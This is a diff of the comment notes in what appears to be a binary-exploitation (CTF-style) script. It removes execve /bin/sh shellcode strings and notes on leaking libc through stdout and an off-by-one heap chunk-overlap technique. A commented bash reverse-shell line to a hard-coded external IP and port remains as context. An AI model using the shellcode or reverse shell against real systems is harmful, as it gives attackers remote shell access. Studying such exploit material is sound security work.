@@ -73,9 +73,6 @@ pause()
 
 # std_in_off = libc.symbols['_IO_2_1_stdin_']
 
-# sc32 = "\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
-# sc64 = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
-
 # t = '''bash -c 'bash -i >& /dev/tcp/47.94.239.235/9981 0>&1'''
 
 # '''0x3057 ^ 0x4f65 ^ 0xffff == 0x80cd'''
@@ -99,36 +96,3 @@ pause()
 # <realloc+12>    push   rbx
 # <realloc+13>    mov    rbx, rdi
 # <realloc+16>    sub    rsp, 0x38
-
-'''
-use stdout to leak libc address
-stdout's address p & *(struct _IO_FILE_plus *) stdout
-then modify write_ptr
-'''
-
-
-''' off by one
----
-0x100 A
----
-0x70 B
----
-0x100 C
----
-0x20 D
---- 
-0x30 E
-
-
-malloc A B C D
-FREE A
-FREE B
-FREE D fill fast bin
-FREE E fill fast bin
-ADD B1 -> OFF BY NULL
-FREE C -> unlink A
-mallc A
-malloc B2 -> overlap chunk
-free B1
-free B2
-'''
